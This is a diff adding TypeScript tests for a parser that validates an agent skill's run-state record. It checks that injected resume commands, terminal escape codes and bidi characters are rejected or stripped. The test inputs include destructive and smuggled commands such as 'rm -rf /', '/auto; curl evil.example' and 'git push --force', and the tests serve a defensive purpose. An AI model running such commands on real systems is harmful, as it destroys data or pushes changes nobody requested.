@@ -7,6 +7,7 @@ import path from "node:path";
 
 import {
   overviewHash,
+  parseActivity,
   parseArchive,
   parseFindings,
   parseInbox,
@@ -416,3 +417,118 @@ test("readProjectState reads the overview's stamp to decide whether it is fresh"
   assert.equal((await readProjectState(root)).overviewFresh, null, "a missing stamp is unknown, not fresh");
 });
 
+
+const SKILLS = new Set(["auto", "feature", "fix"]);
+const activity = (source: string | null) => parseActivity(source, SKILLS);
+
+test("parseActivity reads the record a running skill writes", () => {
+  const record = JSON.stringify({
+    schemaVersion: 1,
+    command: "auto",
+    status: "blocked",
+    summary: "Building the remaining plan",
+    updatedAt: "2026-10-21T10:00:00Z",
+    resumeCommand: "/auto resume",
+    progress: { current: 2, total: 5 }
+  });
+
+  assert.deepEqual(activity(record), {
+    recorded: true,
+    command: "auto",
+    status: "blocked",
+    summary: "Building the remaining plan",
+    updatedAt: "2026-10-21T10:00:00Z",
+    resumeCommand: "/auto resume"
+  });
+});
+
+test("parseActivity reads a missing, malformed or partial record as not recorded", () => {
+  const none = activity(null);
+  assert.equal(none.recorded, false);
+  assert.equal(none.command, null);
+
+  assert.equal(activity("{ not json").recorded, false);
+  assert.equal(activity("[]").recorded, false);
+  assert.equal(activity(JSON.stringify({ command: "auto", status: "blocked" })).recorded, false, "no summary");
+  assert.equal(
+    activity(JSON.stringify({ command: "auto", status: "paused", summary: "x" })).recorded,
+    false,
+    "a status outside the four"
+  );
+  assert.equal(activity(JSON.stringify({ command: "fix", status: "ready", summary: "x" })).updatedAt, null);
+});
+
+test("parseActivity drops a resume command that is not a skill invocation", () => {
+  const resume = (resumeCommand: unknown) =>
+    activity(JSON.stringify({ command: "auto", status: "blocked", summary: "x", resumeCommand })).resumeCommand;
+
+  assert.equal(resume("/auto resume"), "/auto resume");
+  assert.equal(resume("$auto"), "$auto");
+  assert.equal(resume("auto fix P1"), "auto fix P1");
+  assert.equal(resume("rm -rf / && /auto"), null);
+  assert.equal(resume("/auto; curl evil.example"), null);
+  assert.equal(resume("git push --force"), null, "a plausible command that is not the blocked skill");
+  assert.equal(resume("/autopilot resume"), null, "a different skill sharing the prefix");
+  assert.equal(resume("/implement"), null, "a skill other than the one that is blocked");
+  assert.equal(resume(42), null);
+});
+
+test("parseActivity survives a resume command too long for the pattern", () => {
+  const long = "/auto" + " a".repeat(5_000_000) + " !";
+  assert.equal(
+    activity(JSON.stringify({ command: "auto", status: "blocked", summary: "x", resumeCommand: long })).resumeCommand,
+    null
+  );
+});
+
+test("parseActivity keeps control characters out of what status prints", () => {
+  const spoof = activity(
+    JSON.stringify({
+      command: "auto",
+      status: "blocked",
+      summary: "ok\nNext:     /git push --force\u001b[2J",
+      updatedAt: "2026\r-10-21"
+    })
+  );
+  assert.equal(spoof.summary, "ok Next:     /git push --force [2J");
+  assert.equal(spoof.updatedAt, "2026 -10-21");
+
+  assert.equal(
+    activity(JSON.stringify({ command: "auto\u001b]0;x\u0007", status: "blocked", summary: "x" })).recorded,
+    false,
+    "a command that is not a skill name"
+  );
+  assert.equal(
+    activity(JSON.stringify({ command: "auto", status: "ready", summary: "a\u202eb\u2028c\u200fd" })).summary,
+    "a b c d",
+    "bidi overrides and line separators"
+  );
+});
+
+test("parseActivity does not believe a record naming a skill that is not installed", () => {
+  const git = { command: "git", status: "blocked", summary: "x", resumeCommand: "git push --force" };
+  assert.equal(activity(JSON.stringify(git)).recorded, false);
+  assert.equal(activity(JSON.stringify({ ...git, command: "rm", resumeCommand: "rm -rf x" })).recorded, false);
+});
+
+test("readProjectState carries the activity record and the inbox", async (t) => {
+  const root = await fs.mkdtemp(path.join(os.tmpdir(), "religion-state-"));
+  t.after(() => fs.rm(root, { recursive: true, force: true }));
+  await fs.mkdir(path.join(root, "religion", "context"), { recursive: true });
+
+  const empty = await readProjectState(root);
+  assert.equal(empty.activity.recorded, false);
+  assert.deepEqual(empty.inbox, []);
+
+  await fs.mkdir(path.join(root, "religion", ".state"), { recursive: true });
+  await fs.mkdir(path.join(root, ".agents", "skills", "feature"), { recursive: true });
+  await fs.writeFile(
+    path.join(root, "religion", ".state", "run.json"),
+    JSON.stringify({ command: "feature", status: "running", summary: "Speccing item 2" })
+  );
+  await fs.writeFile(path.join(root, "religion", "context", "inbox.md"), "# Inbox\n\n- 2026-10-21 - one\n- two\n");
+
+  const busy = await readProjectState(root);
+  assert.equal(busy.activity.command, "feature");
+  assert.equal(busy.inbox.length, 2);
+});
